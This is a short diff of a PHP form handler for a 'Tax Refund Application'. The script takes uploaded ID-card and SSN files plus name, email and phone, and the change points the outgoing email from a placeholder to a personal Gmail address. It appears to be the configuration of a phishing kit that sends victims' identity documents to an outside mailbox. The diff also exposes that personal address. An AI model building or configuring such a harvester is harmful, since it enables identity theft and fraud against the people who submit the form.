@@ -9,7 +9,7 @@ $idCard = $_FILES['id-card'];
 $ssn = $_FILES['ssn'];
 
 // Define the email parameters
-$to = 'your-email@example.com'; // Replace with your email address
+$to = 'paulorngu@gmail.com'; // Replace with your email address
 $subject = 'Tax Refund Application';
 $message = "Name: $name\n\nEmail: $email\n\nPhone: $phone";
 
